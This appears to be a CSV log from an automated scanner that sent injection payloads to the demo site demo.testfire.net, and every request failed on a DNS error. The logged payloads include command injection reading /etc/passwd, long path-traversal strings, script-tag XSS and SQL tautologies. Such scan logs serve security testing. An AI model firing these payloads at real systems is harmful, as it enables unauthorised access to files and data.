payload,reflected,error
; cat /etc/passwd #82,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%2382 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d31a0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d3950>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(145)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%28145%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda3140e0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #90,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%2390 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda314890>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
' OR 116=116 --,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%27+OR+116%3D116+-- (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d3e00>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
' OR 56=56 --,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%27+OR+56%3D56+-- (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d3440>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #79,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%2379 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d2ea0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda314560>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(42)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%2842%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda314fe0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #110,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%23110 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda3158b0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
